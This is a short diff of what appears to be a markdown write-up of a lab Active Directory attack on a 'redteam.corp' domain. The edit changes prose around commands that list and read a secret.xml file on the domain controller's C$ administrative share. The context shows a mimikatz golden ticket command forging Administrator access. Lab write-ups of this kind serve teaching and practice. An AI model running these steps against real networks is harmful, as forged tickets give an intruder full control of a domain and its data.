@@ -485,15 +485,14 @@ kerberos::golden /user:Administrator /domain:child.redteam.corp /sid:S-1-5-21-23
 misc::cmd
 ```
 
-We verify that we can read the Secret.xml file
+We verified if we had access to RED-DC
 ```python
 dir \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\
 ```
 
-
+And now we can read the Secret Archive.xml
 ```python
 type \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\secret.xml
 ```
-
 
 ![[Pasted image 20250512212141.png]]
